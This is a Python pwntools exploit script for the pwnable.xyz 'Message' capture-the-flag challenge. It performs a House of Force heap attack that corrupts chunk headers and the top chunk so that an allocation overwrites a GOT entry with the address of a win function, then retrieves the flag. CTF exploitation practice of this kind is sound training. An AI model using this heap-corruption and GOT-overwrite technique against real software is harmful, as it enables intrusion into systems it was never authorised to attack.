from pwn import *

# Pwnable.xyz Message challenge

# Use House of Force: https://www.lazenca.net/display/TEC/The+House+of+Force

# It was hard

context(kernel="amd64", arch="amd64", log_level="info")

"""
Menu:
 1. Make note
 2. Edit note
 3. List notes
 0. Exit
> 
"""

def make_note(p, title, note, size, final=False):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"Size: ", str(size).encode("utf-8"))

	if not final:
		p.sendafter(b"Title: ", title)
		p.sendafter(b"Note: ", note)
	else:
		print(f"Flag: {p.recvline().decode('utf-8')}" )


def edit_note(p, number, note):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"Note: ", str(number).encode("utf-8"))

	if p.recv(4) == b"Data":
		p.sendafter(b": ", note)

def list_notes(p):
	p.sendlineafter(b"> ", b"3")

	data = p.recvuntil(b"Menu:")[:-5]
	return data

# Heap structure:
#	p64(0) + (p64(size) | 1)
#	

def parse_addr(data: str, pos: int):
	data_arr = data.split(b":")

	possible_leak = b"\x0a".join(data_arr[pos].split(b"\x0a")[1:])
	print(f"Possible leak: {possible_leak}")
	possible_leak = possible_leak.ljust(8, b"\x00")
	return u64(possible_leak)


def main():
	e = ELF("challenge")
	env = dict(os.environ)

	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		gdb.attach(p, gdbscript="b make_note\nc")
		sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		# p = remote("172.17.0.2", 2020)
		p = remote("svc.pwnable.xyz", 30041)

	win_addr = e.symbols["win"]
	exit_got = e.got["malloc"]	# 0x601210
	base_addr = e.address
	notes_addr = e.symbols["notes"]

	make_note(p, b"F"*0x20, b"", -11)
	list_notes(p)
	make_note(p, b"A"*0x20, b"B"*0x30, 0x30)
	list_notes(p)
	# Owerwrite current tilte chunk and pointer to title in next chunk
	edit_note(p, 0, p64(0)+p64(0x31)+b"A"*0x20     +   p64(0)+p64(0x51)+p32(0x40)+p32(0)+p64(notes_addr+2*8))

	# // Set main_arena->top right before the notes
	make_note(p, b"F"*0x20, b"", -1)
	edit_note(p, 2, p64(0)+p64(0x31)+b"A"*0x20  +  p64(0)+p64(-1, sign="signed"))

	data = list_notes(p)
	third_malloc = parse_addr(data, 1)
	assert(third_malloc > 0xffff) 
	print("Third allocated memory at: 0x%x" % third_malloc)

	cur_top = third_malloc + 0x40

	big_alloc = exit_got - 0x10 - cur_top - 0x10

	# Note wiil be located in heap but title will be alocated in got section
	make_note(p, p64(win_addr), b"", big_alloc-16)

	make_note(p, b"F", b"", 16, final=True)
	p.interactive()


main()